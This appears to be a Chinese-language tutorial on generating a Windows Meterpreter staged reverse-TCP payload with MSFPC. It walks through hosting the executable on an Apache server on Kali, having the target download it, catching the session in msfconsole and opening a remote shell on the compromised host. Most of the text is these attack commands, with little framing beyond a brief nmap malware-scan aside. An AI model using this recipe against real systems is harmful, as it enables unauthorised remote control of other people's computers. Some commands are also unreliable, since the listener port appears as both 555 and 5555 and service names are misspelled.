# Metasploit-MSFPC-paylaod
---

一般来说，生成payload的默认工具是MSFvenom，这是一个独立于Metasploit的payload生成器及编码器。虽然它是一个非常强大的payload生成神器，但是对于一些新手来说，可能难以在短时间内熟悉其操作。即使在进行最初的了解之后，生成一个基本的payload也需要输入相当多的内容，而今天，我们将看到使用MSFPC更便捷地生成paylaod。
MSFPC，或者说是MSFvenom Payload生成器，其实是一个基于MSFvenom的Payload生成器，但是它旨在简化基本的有效载荷创建过程，用户使用MSFPC可以尽可能简单地创建Payload，有时甚至只需要一个参数！如果你以前使用过MSFvenom，那么可能已经自行编写了一个简单的shell脚本来自动化频繁地生成Payload。即使这样，这个工具也绝对值得一试。

通过Nmap脚本扫描WEB服务器或个人计算机是否被植入木马

命令：nmap --script=http-malware-host IP

命令：nmap --script=http-malware-host 192.168.0.103

nmap扫描结果，Host appears to be clean表示扫描的主机没有被植入木马。

普通的经常使用的Payload生成器简

msfvenom

利用命令行查看msfpc payload生成器生成的payload类别。

msfpc --help

利用msfpc开始监听端口并且生成相应的payload

命令：msfpc windows IP port

命令：msfpc windows 192.168.0.104 555

查看msfpc工具生成的payload信息

命令：ls

文件： windows-meterpreter-staged-reverse-tcp-555.exe

文件： windows-meterpreter-staged-reverse-tcp-555.exe.rc(payload配置信息)


---

查看监听主机的apapche2状态

命令：service apapche2 status

开启监听主机的apapche2主机

命令：service apache2 start

将生成的“windows-meterpreter-staged-reverse-tcp-555.exe”文件复制到apapche2目录下

命令：cp windows-meterpreter-staged-reverse-tcp-555.exe /var/www/html

删除“/var/www/html”目录下一些不相干的文件，只保留payload文件

命令：rm /var/www/html/index.html

命令：rm /var/www/html/index.nginx-debian.html

查看“/var/www/html”目录下是否只存在payload文件

命令：ls /var/www/html/

在物理机中访问处于监听状态下的kali linux主机

将生成的payload文件下载到物理主机，

连接payload文件

命令：msfconsole -q -r ‘/root/windows-meterpreter-staged-reverse-tcp-5555-exe.rc’

查看session信息

命令：session -i 1

成功拿下目标主机，查看目标主机的系统信息。

命令：sysinfo

利用shell访问目标主机

命令：shell

解决shell界面乱码问题

chcp 65001

